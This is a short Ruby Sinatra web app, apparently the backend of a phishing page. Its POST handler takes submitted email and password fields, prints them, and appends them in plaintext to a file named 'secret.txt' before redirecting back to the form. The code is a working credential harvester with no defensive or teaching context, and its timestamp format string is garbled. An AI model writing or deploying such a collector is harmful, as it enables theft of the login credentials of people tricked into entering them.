require 'sinatra'

get '/' do
  erb :index
end

post '/' do
  puts params[:email]
  puts params[:pass]
  File.open('secret.txt', 'a') do |f|
    f << Time.new.strftime('%Y-%D-%m %H:%M:%S').to_s + "\n"
    f << 'email:  ' + params[:email] +  "\n"
    f << 'password:  ' + params[:pass] + "\n\n"
  end
  redirect '/'
end